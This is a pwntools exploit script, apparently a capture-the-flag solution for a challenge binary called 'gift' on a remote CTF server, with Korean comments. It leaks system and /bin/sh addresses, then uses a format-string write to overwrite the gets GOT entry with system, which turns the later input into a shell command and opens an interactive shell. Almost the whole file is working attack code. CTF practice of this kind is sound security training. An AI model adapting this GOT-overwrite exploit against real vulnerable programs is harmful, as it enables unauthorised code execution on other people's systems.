from pwn import *

'''
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

context(arch="i386", os='linux')
e = ELF('./gift')

r = remote("ctf.j0n9hyun.xyz", 3018)

# 제일 먼저 실행하면 /bin/sh, system 함수의 주소를 준다
r.recvuntil(b"0x")
binsh = int(r.recv(7),16)
r.recvuntil(b"0x")
system1 = int(r.recv(4),16)
system2 = int(r.recv(4),16)
r.recv()

# 문제에 두가지 취약점이 있는데 먼저 fsb, 그다음 gets함수가 있어 bof가 터진다
'''
...
fgets(&s, 0x80, stdin);
printf(&s);
gets(&s);
...
'''
# printf 전에 fgets로 입력을 받는다.
# 그런데 입력받는 위치가 gets와 fgets가 같다. 같은 변수를 사용하고 있다.
# fgets에서 입력 받은 것을 그대로 gets의 인자로 사용할 수 있다.
# no relro이기 때문에 gets의 got를 system 함수로 덮으면
# gets의 인자가 그대로 system함수의 인자가 된다.
# 앞쪽 dummy를 /bin/sh; 로 구성해서 인자로 사용할 수 있게 한다.
gets_got = e.got['gets']

# fsb
payload  = b"/bin//sh"+p32(0x3b202020)+p32(gets_got)+b"AAAA"+p32(gets_got+2)
payload += b"%"+bytes(str(system2-len(payload)),"utf-8")+b"x%4$hn"
payload += b"%"+bytes(str(system1-system2),"utf-8")+b"x%6$hn"
print("payload len = ",len(payload))
r.sendline(payload)
r.interactive()